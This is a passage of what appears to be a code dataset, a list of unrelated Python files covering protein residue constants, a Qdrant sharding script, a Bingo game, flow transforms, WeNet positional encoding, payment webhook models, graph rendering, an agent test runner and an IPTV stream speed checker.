[1.0, 1.0, 1.0, 1.0],  # ARG\n    [1.0, 1.0, 0.0, 0.0],  # ASN\n    [1.0, 1.0, 0.0, 0.0],  # ASP\n    [1.0, 0.0, 0.0, 0.0],  # CYS\n    [1.0, 1.0, 1.0, 0.0],  # GLN\n    [1.0, 1.0, 1.0, 0.0],  # GLU\n    [0.0, 0.0, 0.0, 0.0],  # GLY\n    [1.0, 1.0, 0.0, 0.0],  # HIS\n    [1.0, 1.0, 0.0, 0.0],  # ILE\n    [1.0, 1.0, 0.0, 0.0],  # LEU\n    [1.0, 1.0, 1.0, 1.0],  # LYS\n    [1.0, 1.0, 1.0, 0.0],  # MET\n    [1.0, 1.0, 0.0, 0.0],  # PHE\n    [1.0, 1.0, 0.0, 0.0],  # PRO\n    [1.0, 0.0, 0.0, 0.0],  # SER\n    [1.0, 0.0, 0.0, 0.0],  # THR\n    [1.0, 1.0, 0.0, 0.0],  # TRP\n    [1.0, 1.0, 0.0, 0.0],  # TYR\n    [1.0, 0.0, 0.0, 0.0],  # VAL\n]\n\n# The following chi angles are pi periodic: they can be rotated by a multiple\n# of pi without affecting the structure.\nchi_pi_periodic = [\n    [0.0, 0.0, 0.0, 0.0],  # ALA\n    [0.0, 0.0, 0.0, 0.0],  # ARG\n    [0.0, 0.0, 0.0, 0.0],  # ASN\n    [0.0, 1.0, 0.0, 0.0],  # ASP\n    [0.0, 0.0, 0.0, 0.0],  # CYS\n    [0.0, 0.0, 0.0, 0.0],  # GLN\n    [0.0, 0.0, 1.0, 0.0],  # GLU\n    [0.0, 0.0, 0.0, 0.0],  # GLY\n    [0.0, 0.0, 0.0, 0.0],  # HIS\n    [0.0, 0.0, 0.0, 0.0],  # ILE\n    [0.0, 0.0, 0.0, 0.0],  # LEU\n    [0.0, 0.0, 0.0, 0.0],  # LYS\n    [0.0, 0.0, 0.0, 0.0],  # MET\n    [0.0, 1.0, 0.0, 0.0],  # PHE\n    [0.0, 0.0, 0.0, 0.0],  # PRO\n    [0.0, 0.0, 0.0, 0.0],  # SER\n    [0.0, 0.0, 0.0, 0.0],  # THR\n    [0.0, 0.0, 0.0, 0.0],  # TRP\n    [0.0, 1.0, 0.0, 0.0],  # TYR\n    [0.0, 0.0, 0.0, 0.0],  # VAL\n    [0.0, 0.0, 0.0, 0.0],  # UNK\n]\n\n# Atoms positions relative to the 8 rigid groups, defined by the pre-omega, phi,\n# psi and chi angles:\n# 0: 'backbone group',\n# 1: 'pre-omega-group', (empty)\n# 2: 'phi-group', (currently empty, because it defines only hydrogens)\n# 3: 'psi-group',\n# 4,5,6,7: 'chi1,2,3,4-group'\n# The atom positions are relative to the axis-end-atom of the corresponding\n# rotation axis. The x-axis is in direction of the rotation axis, and the y-axis\n# is defined such that the dihedral-angle-definiting atom (the last entry in\n# chi_angles_atoms above) is in the xy-plane (with a positive y-coordinate).\n# format: [atomname, group_idx, rel_position]\nrigid_group_atom_positions = {\n   ",
    "import logging\nfrom qdrant_client import QdrantClient\nfrom qdrant_client.http import models\nimport random\n\n# Configure logging for your application\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\n# Increase log level for httpx to WARNING to suppress its INFO logs\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\n\nclient = QdrantClient(\"localhost\", port=6333)\ncollection_name = \"sharding_collection\"\nkey = \"tempKey\"\n\n# Deleting an existing collection if it exists\nresponse = client.delete_collection(collection_name=f\"{collection_name}\")\nlogger.info(f\"Deleted collection '{collection_name}': {response}\")\n\n# Creating a new collection with specific configuration\nresponse = client.create_collection(\n    collection_name=f\"{collection_name}\",\n    shard_number=6,\n    sharding_method=models.ShardingMethod.CUSTOM,\n    vectors_config=models.VectorParams(size=768, distance=models.Distance.COSINE)\n)\nlogger.info(f\"Created collection '{collection_name}' with custom sharding: {response}\")\n\n# Creating a shard key for the collection\nresponse = client.create_shard_key(f\"{collection_name}\", f\"{key}\")\nlogger.info(f\"Created shard key '{key}' for collection '{collection_name}': {response}\")\n\n# Counter for generating unique point IDs\npoint_counter = 0\n\n# Function to generate a random vector of 768 dimensions with up to 15 decimal points\ndef generate_random_vector():\n    return [round(random.uniform(0, 1), 15) for _ in range(768)]\n\n# Run the loop 1000 times\nfor _ in range(1000):\n    random_vector = generate_random_vector()\n    point_counter += 1\n    response = client.upsert(\n        collection_name=f\"{collection_name}\",\n        points=[\n            models.PointStruct(\n                id=point_counter,\n                vector=random_vector,\n            ),\n        ],\n        shard_key_selector=f\"{key}\",\n    )\n    logger.info(f\"Upserted point with ID {point_counter} into collection '{collection_name}' with shard key '{key}': {response}\")",
    "# -*- coding: utf-8 -*-\n\"\"\"BINGO\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1cXuoqQHOQSLYLB8cSJnXLXnDmOz8bITP\n\"\"\"\n\nimport random\nimport time\nimport ipywidgets as widgets\nfrom IPython.display import display, HTML\n\nclass Cores:\n    DISPONIVEIS = {\n        'vermelho': 'red',\n        'verde': 'green',\n        'amarelo': 'yellow',\n        'azul': 'blue',\n        'magenta': 'magenta',\n        'ciano': 'cyan',\n    }\n\nclass Numeros:\n    def __init__(self, maximo=75):\n        self.maximo = maximo\n        self.sorteados = []\n\n    def sortear(self):\n        if len(self.sorteados) < self.maximo:\n            while True:\n                numero = random.randint(1, self.maximo)\n                if numero not in self.sorteados:\n                    self.sorteados.append(numero)\n                    return numero\n        else:\n            return None\n\nclass Cartela:\n    def __init__(self, nome_jogador, cor_marcacao):\n        self.nome_jogador = nome_jogador[0].upper() + nome_jogador[1:].lower()\n        self.cor_marcacao = cor_marcacao\n        self.cartela = [[None for _ in range(5)] for _ in range(5)]\n        self.marcadas = [[False for _ in range(5)] for _ in range(5)]\n        self.popular_cartela()\n\n    def popular_cartela(self):\n        numeros = list(range(1, 76))\n        random.shuffle(numeros)\n        for i in range(5):\n            for j in range(5):\n                self.cartela[i][j] = numeros.pop()\n\n    def marcar_numero(self, numero):\n        for i in range(5):\n            for j in range(5):\n                if self.cartela[i][j] == numero:\n                    self.marcadas[i][j] = True\n                    return True\n        return False\n\n    def checar_vitoria(self):\n        return any(all(row) for row in self.marcadas) or \\\n               any(all(self.marcadas[row][col] for row in range(5)) for col in range(5)) or \\\n               all(self.marcadas[i][i] for i in range(5)) or \\\n               all(self.marcadas[i][4-i] for i in range(5)) or \\\n               all(all(row) for row in self.marcadas)\n\n    def exibir(self):\n        cartela_html = f\"<h2>Cartela de {self.nome_jogador}</h2>\"\n        cartela_html += \"<table>\"\n        for i in range(5):\n            cartela_html += \"<tr>\"\n            for j in range(5):\n                numero = self.cartela[i][j]\n                if self.marcadas[i][j]:\n                    cartela_html += f\"<td style='background-color: {self.cor_marcacao}; color: white;'>{numero}</td>\"\n                else:\n                    cartela_html += f\"<td>{numero}</td>\"\n            cartela_html += \"</tr>\"\n        cartela_html += \"</table>\"\n        display(HTML(cartela_html))\n\nclass Bingo:\n    def __init__(self, intervalo_max=75, velocidade=1):\n        self.numeros = Numeros(intervalo_max)\n        self.cartelas = []\n        self.velocidade = velocidade\n\n    def adicionar_cartela(self, nome_jogador, cor):\n        self.cartelas.append(Cartela(nome_jogador, cor))\n\n    def jogar(self, max_rodadas=None):\n        rodada_atual = 0\n\n        while True:\n            if max_rodadas is not None and rodada_atual >= max_rodadas:\n                print(\"O jogo terminou sem vencedores.\")\n                break\n\n            num = self.numeros.sortear()\n            if num is None:\n                print(\"Todos os n\u00fameros foram sorteados. Jogo encerrado.\")\n                break\n            print(f\"N\u00famero sorteado: {num}\")\n            vencedor = False\n            for cartela in self.cartelas:\n                cartela.marcar_numero(num)\n                cartela.exibir()\n                if cartela.checar_vitoria():\n                    print(f\"{cartela.nome_jogador} venceu o jogo!\")\n                    vencedor = True\n                    break\n            if vencedor:\n                break\n            rodada_atual += 1\n            time.sleep(self.velocidade)\n\n# Fun\u00e7\u00e3o para iniciar o jogo de Bingo\ndef iniciar_bingo(quantidade_cartelas, nomes_jogadores, cores):\n    bingo = Bingo(75)\n\n    for i in range(quantidade_cartelas):\n        bingo.adicionar_cartela(nomes_jogadores[i], cores[i])\n\n    bingo.jogar()\n\n# Interface interativa para iniciar o jogo\nquantidade_cartelas = widgets.IntSlider(value=1, min=1, max=5, description='Quantidade de Cartelas:')\nnomes_jogadores = [widgets.Text(description=f\"Nome do Jogador {i+1}:\") for i in range(5)]\ncores = [widgets.Dropdown(options=Cores.DISPONIVEIS.keys(), value='vermelho', description=f\"Cor do Jogador {i+1}:\") for i in range(5)]\n\nbotao_iniciar = widgets.Button(description=\"Iniciar Jogo\")\n\ndef iniciar_jogo(b):\n    nomes = [nome.value for nome in nomes_jogadores[:quantidade_cartelas.value]]\n    cores_jogadores = [Cores.DISPONIVEIS[cor.value] for cor in cores[:quantidade_cartelas.value]]\n    iniciar_bingo(quantidade_cartelas.value, nomes, cores_jogadores)\n\nbotao_iniciar.on_click(iniciar_jogo)\n\ndisplay(quantidade_cartelas)\nfor nome in nomes_jogadores:\n    display(nome)\nfor cor in cores:\n    display(cor)\ndisplay(botao_iniciar)",
    "\"\"\"Implementations of linear transforms.\"\"\"\n\nimport numpy as np\nimport torch\n\nfrom torch import nn\nfrom torch.nn import functional as F, init\n\nfrom LiLY.modules import components\nfrom . import utils\n\nclass LinearCache(object):\n    \"\"\"Helper class to store the cache of a linear transform.\n\n    The cache consists of: the weight matrix, its inverse and its log absolute determinant.\n    \"\"\"\n\n    def __init__(self):\n        self.weight = None\n        self.inverse = None\n        self.logabsdet = None\n\n    def invalidate(self):\n        self.weight = None\n        self.inverse = None\n        self.logabsdet = None\n\n\nclass Linear(components.Transform):\n    \"\"\"Abstract base class for linear transforms that parameterize a weight matrix.\"\"\"\n\n    def __init__(self, features, using_cache=False):\n        if not utils.is_positive_int(features):\n            raise TypeError('Number of features must be a positive integer.')\n        super().__init__()\n\n        self.features = features\n        self.bias = nn.Parameter(torch.zeros(features))\n\n        # Caching flag and values.\n        self.using_cache = using_cache\n        self.cache = LinearCache()\n\n    def forward(self, inputs, context=None):\n        if not self.training and self.using_cache:\n            self._check_forward_cache()\n            outputs = F.linear(inputs, self.cache.weight, self.bias)\n            logabsdet = self.cache.logabsdet * torch.ones(outputs.shape[0])\n            return outputs, logabsdet\n        else:\n            return self.forward_no_cache(inputs)\n\n    def _check_forward_cache(self):\n        if self.cache.weight is None and self.cache.logabsdet is None:\n            self.cache.weight, self.cache.logabsdet = self.weight_and_logabsdet()\n\n        elif self.cache.weight is None:\n            self.cache.weight = self.weight()\n\n        elif self.cache.logabsdet is None:\n            self.cache.logabsdet = self.logabsdet()\n\n    def inverse(self, inputs, context=None):\n        if not self.training and self.using_cache:\n            self._check_inverse_cache()\n            outputs = F.linear(inputs - self.bias, self.cache.inverse)\n            logabsdet = (-self.cache.logabsdet) * torch.ones(outputs.shape[0])\n            return outputs, logabsdet\n        else:\n            return self.inverse_no_cache(inputs)\n\n    def _check_inverse_cache(self):\n        if self.cache.inverse is None and self.cache.logabsdet is None:\n            self.cache.inverse, self.cache.logabsdet = self.weight_inverse_and_logabsdet()\n\n        elif self.cache.inverse is None:\n            self.cache.inverse = self.weight_inverse()\n\n        elif self.cache.logabsdet is None:\n            self.cache.logabsdet = self.logabsdet()\n\n    def train(self, mode=True):\n        if mode:\n            # If training again, invalidate cache.\n            self.cache.invalidate()\n        return super().train(mode)\n\n    def use_cache(self, mode=True):\n        if not utils.is_bool(mode):\n            raise TypeError('Mode must be boolean.')\n        self.using_cache = mode\n\n    def weight_and_logabsdet(self):\n        # To be overridden by subclasses if it is more efficient to compute the weight matrix\n        # and its logabsdet together.\n        return self.weight(), self.logabsdet()\n\n    def weight_inverse_and_logabsdet(self):\n        # To be overridden by subclasses if it is more efficient to compute the weight matrix\n        # inverse and weight matrix logabsdet together.\n        return self.weight_inverse(), self.logabsdet()\n\n    def forward_no_cache(self, inputs):\n        \"\"\"Applies `forward` method without using the cache.\"\"\"\n        raise NotImplementedError()\n\n    def inverse_no_cache(self, inputs):\n        \"\"\"Applies `inverse` method without using the cache.\"\"\"\n        raise NotImplementedError()\n\n    def weight(self):\n        \"\"\"Returns the weight matrix.\"\"\"\n        raise NotImplementedError()\n\n    def weight_inverse(self):\n        \"\"\"Returns the inverse weight matrix.\"\"\"\n        raise NotImplementedError()\n\n    def logabsdet(self):\n        \"\"\"Returns the log absolute determinant of the weight matrix.\"\"\"\n        raise NotImplementedError()\n\n\nclass NaiveLinear(Linear):\n    \"\"\"A general linear transform that uses an unconstrained weight matrix.\n\n    This transform explicitly computes the log absolute determinant in the forward direction\n    and uses a linear solver in the inverse direction.\n\n    Both forward and inverse directions have a cost of O(D^3), where D is the dimension\n    of the input.\n    \"\"\"\n\n    def __init__(self, features, orthogonal_initialization=True, using_cache=False):\n        \"\"\"Constructor.\n\n        Args:\n            features: int, number of input features.\n            orthogonal_initialization: bool, if True initialize weights to be a random\n                orthogonal matrix.\n\n        Raises:\n            TypeError: if `features` is not a positive integer.\n        \"\"\"\n        super().__init__(features, using_cache)\n\n        if orthogonal_initialization:\n            self._weight = nn.Parameter(u",
    "# This module is from [WeNet](https://github.com/wenet-e2e/wenet).\n\n# ## Citations\n\n# ```bibtex\n# @inproceedings{yao2021wenet,\n#   title={WeNet: Production oriented Streaming and Non-streaming End-to-End Speech Recognition Toolkit},\n#   author={Yao, Zhuoyuan and Wu, Di and Wang, Xiong and Zhang, Binbin and Yu, Fan and Yang, Chao and Peng, Zhendong and Chen, Xiaoyu and Xie, Lei and Lei, Xin},\n#   booktitle={Proc. Interspeech},\n#   year={2021},\n#   address={Brno, Czech Republic },\n#   organization={IEEE}\n# }\n\n# @article{zhang2022wenet,\n#   title={WeNet 2.0: More Productive End-to-End Speech Recognition Toolkit},\n#   author={Zhang, Binbin and Wu, Di and Peng, Zhendong and Song, Xingchen and Yao, Zhuoyuan and Lv, Hang and Xie, Lei and Yang, Chao and Pan, Fuping and Niu, Jianwei},\n#   journal={arXiv preprint arXiv:2203.15455},\n#   year={2022}\n# }\n#\n\n\"\"\"Positonal Encoding Module.\"\"\"\n\nimport math\nfrom typing import Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\n\n\nclass PositionalEncoding(torch.nn.Module):\n    \"\"\"Positional encoding.\n\n    :param int d_model: embedding dim\n    :param float dropout_rate: dropout rate\n    :param int max_len: maximum input length\n\n    PE(pos, 2i)   = sin(pos/(10000^(2i/dmodel)))\n    PE(pos, 2i+1) = cos(pos/(10000^(2i/dmodel)))\n    \"\"\"\n\n    def __init__(\n        self,\n        d_model: int,\n        dropout_rate: float,\n        max_len: int = 5000,\n        reverse: bool = False,\n    ):\n        \"\"\"Construct an PositionalEncoding object.\"\"\"\n        super().__init__()\n        self.d_model = d_model\n        self.xscale = math.sqrt(self.d_model)\n        self.dropout = torch.nn.Dropout(p=dropout_rate)\n        self.max_len = max_len\n\n        self.pe = torch.zeros(self.max_len, self.d_model)\n        position = torch.arange(0, self.max_len, dtype=torch.float32).unsqueeze(1)\n        div_term = torch.exp(\n            torch.arange(0, self.d_model, 2, dtype=torch.float32)\n            * -(math.log(10000.0) / self.d_model)\n        )\n        self.pe[:, 0::2] = torch.sin(position * div_term)\n        self.pe[:, 1::2] = torch.cos(position * div_term)\n        self.pe = self.pe.unsqueeze(0)\n\n    def forward(\n        self, x: torch.Tensor, offset: Union[int, torch.Tensor] = 0\n    ) -> Tuple[torch.Tensor, torch.Tensor]:\n        \"\"\"Add positional encoding.\n\n        Args:\n            x (torch.Tensor): Input. Its shape is (batch, time, ...)\n            offset (int, torch.tensor): position offset\n\n        Returns:\n            torch.Tensor: Encoded tensor. Its shape is (batch, time, ...)\n            torch.Tensor: for compatibility to RelPositionalEncoding\n        \"\"\"\n\n        self.pe = self.pe.to(x.device)\n        pos_emb = self.position_encoding(offset, x.size(1), False)\n        x = x * self.xscale + pos_emb\n        return self.dropout(x), self.dropout(pos_emb)\n\n    def position_encoding(\n        self, offset: Union[int, torch.Tensor], size: int, apply_dropout: bool = True\n    ) -> torch.Tensor:\n        \"\"\"For getting encoding in a streaming fashion\n\n        Attention!!!!!\n        we apply dropout only once at the whole utterance level in a none\n        streaming way, but will call this function several times with\n        increasing input size in a streaming scenario, so the dropout will\n        be applied several times.\n\n        Args:\n            offset (int or torch.tensor): start offset\n            size (int): required size of position encoding\n\n        Returns:\n            torch.Tensor: Corresponding encoding\n        \"\"\"\n        # How to subscript a Union type:\n        #   https://github.com/pytorch/pytorch/issues/69434\n        if isinstance(offset, int):\n            assert offset + size < self.max_len\n            pos_emb = self.pe[:, offset : offset + size]\n        elif isinstance(offset, torch.Tensor) and offset.dim() == 0:  # scalar\n            assert offset + size < self.max_len\n            pos_emb = self.pe[:, offset : offset + size]\n        else:  # for batched streaming decoding on GPU\n            assert torch.max(offset) + size < self.max_len\n            index = offset.unsqueeze(1) + torch.arange(0, size).to(\n                offset.device\n            )  # B X T\n            flag = index > 0\n            # remove negative offset\n            index = index * flag\n            pos_emb = F.embedding(index, self.pe[0])  # B X T X d_model\n\n        if apply_dropout:\n            pos_emb = self.dropout(pos_emb)\n        return pos_emb\n\n\nclass RelPositionalEncoding(PositionalEncoding):\n    \"\"\"Relative positional encoding module.\n    See : Appendix B in https://arxiv.org/abs/1901.02860\n    Args:\n        d_model (int): Embedding dimension.\n        dropout_rate (float): Dropout rate.\n        max_len (int): Maximum input length.\n    \"\"\"\n\n    def __init__(self, d_model: int, dropout_rate: float, max_len: int = 5000):\n        \"\"\"Initialize class.\"\"\"\n        super().__init__(d_model, dropout_rate, max_len, reverse=True)\n\n    def forward(\n        self, x: torch.Tensor, offset: Union[int, torch.Tensor] = 0\n    ) ->",
    "\"\"\"\nthe base webhook data structure\n\"\"\"\nfrom typing import Optional, List\nfrom pydantic import BaseModel, Field\n\n\nclass Refund(BaseModel):\n    \"\"\"\n    the refund response model.\n    \"\"\"\n    refund_id: Optional[str] = Field(\n        alias=\"RefundId\"\n    )\n    status: Optional[str] = Field(\n        alias=\"Status\"\n    )\n    refundable: Optional[bool] = Field(\n        alias=\"Refundable\"\n    )\n    amount: Optional[float] = Field(\n        alias=\"Amount\"\n    )\n    requested_amount: Optional[float] = Field(\n        alias=\"RequestedAmount\"\n    )\n    reject_reason: Optional[str] = Field(\n        alias=\"RejectReason\"\n    )\n    refund_date: Optional[int] = Field(\n        alias=\"RefundDate\"\n    )\n    refund_date_iso: Optional[str] = Field(\n        alias=\"RefundDateIso\"\n    )\n    revisions: Optional[list] = Field(\n        alias=\"Revisions\"\n    )\n\n\nclass Payer(BaseModel):\n    \"\"\"\n    the payer response model\n    \"\"\"\n    phone: Optional[str] = Field(\n        alias=\"Phone\"\n    )\n    full_name: Optional[str] = Field(\n        alias=\"FullName\"\n    )\n\n\nclass UzRegulatoryOrderDetails(BaseModel):\n    \"\"\"\n    Regulatory order details\n    \"\"\"\n    taxi_tin: Optional[str] = None\n    latitude: Optional[str] = None\n    longitude: Optional[str] = None\n    taxi_pinfl: Optional[str] = None\n    taxi_vehicle_number: Optional[str] = None\n\n\nclass ExtraAttributes(BaseModel):\n    \"\"\"\n    Extra attributes\n    \"\"\"\n    key: str = Field(alias=\"Key\")\n    value: str = Field(alias=\"Value\")\n    description: Optional[str] = Field(alias=\"Description\")\n\n    def to_dict(self):\n        \"\"\"\n        Dictionary representation.\n        \"\"\"\n        return {\n            \"Key\": self.key,\n            \"Value\": self.value,\n            \"Description\": self.description\n        }\n\n\nclass ShippingAddress(BaseModel):\n    \"\"\"\n    Shipping address\n    \"\"\"\n    city: Optional[str] = None\n    line1: Optional[str] = None\n    line2: Optional[str] = None\n    state: Optional[str] = None\n    country: Optional[str] = None\n    last_name: Optional[str] = None\n    first_name: Optional[str] = None\n    postal_code: Optional[str] = None\n    phone_number: Optional[str] = None\n\n\nclass BillingAddress(BaseModel):\n    \"\"\"\n    billing adddress\n    \"\"\"\n    city: Optional[str] = None\n    line1: Optional[str] = None\n    line2: Optional[str] = None\n    state: Optional[str] = None\n    country: Optional[str] = None\n    last_name: Optional[str] = None\n    first_name: Optional[str] = None\n    postal_code: Optional[str] = None\n    phone_number: Optional[str] = None\n\n\nclass Order(BaseModel):\n    \"\"\"\n    Order details\n    \"\"\"\n    order_id: Optional[str] = Field(alias=\"OrderId\")\n    order_items: Optional[str] = Field(alias=\"OrderItems\")\n    billing_address: BillingAddress = Field(alias=\"BillingAddress\")\n    shipping_address: ShippingAddress = Field(alias=\"ShippingAddress\")\n    uz_regulatory_order_details: UzRegulatoryOrderDetails = Field(\"UzRegulatoryOrderDetails\")  # noqa\n\n\nclass Metadata(BaseModel):\n    \"\"\"\n    Metadata details\n    \"\"\"\n    order: Order = Field(alias=\"Order\")\n    channel: Optional[str] = Field(alias=\"Channel\")\n    extra_attributes: List[ExtraAttributes] = Field(alias=\"ExtraAttributes\")\n",
    "from typing import Iterable, Union\n\nimport graphviz\nfrom langchain_community.graphs.graph_document import GraphDocument, Node\n\nfrom knowledge_graph.knowledge_schema import KnowledgeSchema\n\n\ndef _node_label(node: Node) -> str:\n    return f\"{node.id} [{node.type}]\"\n\n\ndef print_graph_documents(graph_documents: Union[GraphDocument, Iterable[GraphDocument]]):\n    if isinstance(graph_documents, GraphDocument):\n        graph_documents = [graph_documents]\n\n    for doc in graph_documents:\n        for relation in doc.relationships:\n            source = relation.source\n            target = relation.target\n            type = relation.type\n            print(f\"{_node_label(source)} -> {_node_label(target)}: {type}\")\n\n\ndef render_graph_documents(\n    graph_documents: Union[GraphDocument, Iterable[GraphDocument]],\n) -> graphviz.Digraph:\n    if isinstance(graph_documents, GraphDocument):\n        graph_documents = [GraphDocument]\n\n    dot = graphviz.Digraph()\n\n    nodes = {}\n\n    def _node_id(node: Node) -> int:\n        node_key = (node.id, node.type)\n        if node_id := nodes.get(node_key, None):\n            return node_id\n        else:\n            node_id = f\"{len(nodes)}\"\n            nodes[node_key] = node_id\n            dot.node(node_id, label=_node_label(node))\n            return node_id\n\n    for graph_document in graph_documents:\n        for node in graph_document.nodes:\n            _node_id(node)\n        for r in graph_document.relationships:\n            dot.edge(_node_id(r.source), _node_id(r.target), r.type)\n\n    return dot\n\n\ndef render_knowledge_schema(knowledge_schema: KnowledgeSchema) -> graphviz.Digraph:\n    dot = graphviz.Digraph()\n\n    for node in knowledge_schema.nodes:\n        dot.node(node.type, tooltip=node.description)\n\n    for r in knowledge_schema.relationships:\n        for source in r.source_types:\n            for target in r.target_types:\n                dot.edge(source, target, label=r.edge_type, tooltip=r.description)\n\n    return dot\n",
    "import argparse\nimport csv\nimport json\nimport logging\nimport os\n\nfrom dotenv import load_dotenv\n\nfrom src.agents.math_viz_agent import MathVizAgent\n\nlogging.basicConfig(\n    level=logging.INFO,\n    format=\"[%(asctime)s] {%(filename)s:%(lineno)d} %(levelname)s - %(message)s\",\n)\n\ndef parse_args():\n    parser = argparse.ArgumentParser(\n        description=\"Test utterances against the math vizualization agent\"\n        \"\")\n    parser.add_argument(\n        \"--input_folder\",\n        type=str,\n        default=\"tests\",\n        help=\"Folder where test files reside\"\n    )\n    parser.add_argument(\n        \"--test_files\",\n        type=str,\n        nargs=\"+\",\n        help=\"Csv files with test cases\"\n    )\n    parser.add_argument(\n        \"--output_folder\",\n        type=str,\n        default=\"tests/output\",\n        help=\"Folder to save output\"\n    )\n    args = parser.parse_args()\n    return args\n\ndef evaluate_utterances_in_file(test_file, input_folder):\n    results = []\n    math_viz_agent = MathVizAgent()\n    with open(\n        os.path.join(input_folder, test_file),\n        encoding='utf-8-sig',\n        newline=''\n    ) as f:\n        reader = csv.DictReader(f)\n        curr_qid, state = None, None\n        for row in reader:\n            logging.info(row)\n            if str(row[\"id\"]) == curr_qid and curr_qid is not None:\n                calculator_state = [json.dumps(s) for s in state]\n            else:\n                calculator_state = []\n            expressions = math_viz_agent.process_user_request(\n                row[\"query\"],\n                calculator_state\n            )\n            final_expr_str = None\n            for expr in expressions:\n                final_expr_str = expr\n            final_expressions = json.loads(final_expr_str)[\"expressions\"]\n            results.append({\n                \"id\": str(row[\"id\"]),\n                \"query\": row[\"query\"],\n                \"ground truth\": row[\"ground truth\"],\n                \"output\": json.dumps(final_expressions),\n            })\n            state, curr_qid = [e[\"expression\"] for e in final_expressions], str(row[\"id\"])\n    return results\n\ndef output_results(results, output_folder, test_file):\n    output_file = test_file.split(\"/\")[-1].replace(\".csv\", \"_results.csv\")\n    with open(os.path.join(output_folder, output_file), \"w\") as f:\n        writer = csv.DictWriter(\n            f,\n            fieldnames=[\n                \"id\", \"query\", \"ground truth\", \"output\"\n            ]\n        )\n        writer.writeheader()\n        for result in results:\n            writer.writerow(result)\n\ndef process_file(test_file, input_folder, output_folder):\n    results = []\n    logging.info(f\"Processing test file: {test_file}\")\n    try:\n        results = evaluate_utterances_in_file(test_file, input_folder)\n        output_results(results, output_folder, test_file)\n    except Exception as e:\n        logging.error(f\"Error processing test file: {e}\")\n\ndef main(args):\n    for test_file in args.test_files:\n        process_file(test_file, args.input_folder, args.output_folder)\n\nif __name__ == \"__main__\":\n    args = parse_args()\n    load_dotenv()\n    main(args)\n",
    "import os\nimport re\nimport time\nimport datetime\nimport threading\nfrom queue import Queue\nimport requests\nimport eventlet\neventlet.monkey_patch()\n\n# \u7ebf\u7a0b\u5b89\u5168\u7684\u961f\u5217\uff0c\u7528\u4e8e\u5b58\u50a8\u4e0b\u8f7d\u4efb\u52a1\ntask_queue = Queue()\n\n# \u7ebf\u7a0b\u5b89\u5168\u7684\u5217\u8868\uff0c\u7528\u4e8e\u5b58\u50a8\u7ed3\u679c\nresults = []\n\nchannels = []\nerror_channels = []\n\nwith open(\"tv/itv.txt\", 'r', encoding='utf-8') as file:\n    lines = file.readlines()\n    for line in lines:\n        line = line.strip()\n        if line:\n            channel_name, channel_url = line.split(',')\n                \n            renhe_channels = ['\u7535\u5f71', '\u5267\u573a', '\u7535\u89c6\u5267', '\u76f8\u58f0\u5c0f\u54c1', 'CHC']\n            # \u68c0\u67e5\u9891\u9053\u540d\u79f0\u662f\u5426\u4e0d\u5305\u542b\u8981\u6392\u9664\u7684\u9891\u9053\u540d\u79f0\n            if any(excluded in channel_name for excluded in renhe_channels):\n                channels.append((channel_name, channel_url))\n\n# \u5b9a\u4e49\u5de5\u4f5c\u7ebf\u7a0b\u51fd\u6570\ndef worker():\n    while True:\n        # \u4ece\u961f\u5217\u4e2d\u83b7\u53d6\u4e00\u4e2a\u4efb\u52a1\n        channel_name, channel_url = task_queue.get()\n        try:\n            channel_url_t = channel_url.rstrip(channel_url.split('/')[-1])  # m3u8\u94fe\u63a5\u524d\u7f00\n            lines = requests.get(channel_url,timeout=1).text.strip().split('\\n')  # \u83b7\u53d6m3u8\u6587\u4ef6\u5185\u5bb9\n            ts_lists = [line.split('/')[-1] for line in lines if line.startswith('#') == False]  # \u83b7\u53d6m3u8\u6587\u4ef6\u4e0b\u89c6\u9891\u6d41\u540e\u7f00\n            ts_lists_0 = ts_lists[0].rstrip(ts_lists[0].split('.ts')[-1])  # m3u8\u94fe\u63a5\u524d\u7f00\n            ts_url = channel_url_t + ts_lists[0]  # \u62fc\u63a5\u5355\u4e2a\u89c6\u9891\u7247\u6bb5\u4e0b\u8f7d\u94fe\u63a5\n\n            # \u591a\u83b7\u53d6\u7684\u89c6\u9891\u6570\u636e\u8fdb\u884c5\u79d2\u949f\u9650\u5236\n            with eventlet.Timeout(5, False):\n                start_time = time.time()\n                content = requests.get(ts_url,timeout=1).content\n                end_time = time.time()\n                response_time = (end_time - start_time) * 1\n\n            if content:\n                with open(ts_lists_0, 'ab') as f:\n                    f.write(content)  # \u5199\u5165\u6587\u4ef6\n                file_size = len(content)\n                # print(f\"\u6587\u4ef6\u5927\u5c0f\uff1a{file_size} \u5b57\u8282\")\n                download_speed = file_size / response_time / 1024\n                # print(f\"\u4e0b\u8f7d\u901f\u5ea6\uff1a{download_speed:.3f} kB/s\")\n                normalized_speed = min(max(download_speed / 1024, 0.001), 100)  # \u5c06\u901f\u7387\u4ecekB/s\u8f6c\u6362\u4e3aMB/s\u5e76\u9650\u5236\u57281~100\u4e4b\u95f4\n                #print(f\"\u6807\u51c6\u5316\u540e\u7684\u901f\u7387\uff1a{normalized_speed:.3f} MB/s\")\n\n                # \u5220\u9664\u4e0b\u8f7d\u7684\u6587\u4ef6\n                os.remove(ts_lists_0)\n                result = channel_name, channel_url, f\"{normalized_speed:.3f} MB/s\"\n                results.append(result)\n                numberx = (len(results) + len(error_channels)) / len(channels) * 100\n                print(f\"\u5176\u4ed6  \u53ef\u7528\u9891\u9053\uff1a{len(results)} \u4e2a , \u4e0d\u53ef\u7528\u9891\u9053\uff1a{len(error_channels)} \u4e2a , \u603b\u9891\u9053\uff1a{len(channels)} \u4e2a ,\u603b\u8fdb\u5ea6\uff1a{numberx:.2f} %\u3002\")\n        except:\n            error_channel = channel_name, channel_url\n            error_channels.append(error_channel)\n            numberx = (len(results) + len(error_channels)) / len(channels) * 100\n            print(f\"\u5176\u4ed6  \u53ef\u7528\u9891\u9053\uff1a{len(results)} \u4e2a , \u4e0d\u53ef\u7528\u9891\u9053\uff1a{len(error_channels)} \u4e2a , \u603b\u9891\u9053\uff1a{len(channels)} \u4e2a ,\u603b\u8fdb\u5ea6\uff1a{numberx:.2f} %\u3002\")\n\n        # \u6807\u8bb0\u4efb\u52a1\u5b8c\u6210\n        task_queue.task_done()\n\n\n# \u521b\u5efa\u591a\u4e2a\u5de5\u4f5c\u7ebf\u7a0b\nnum_threads = 10\nfor _ in range(num_threads):\n    t = threading.Thread(target=worker, daemon=True) \n    #t = threading.Thread(target=worker, args=(event,len(channels)))  # 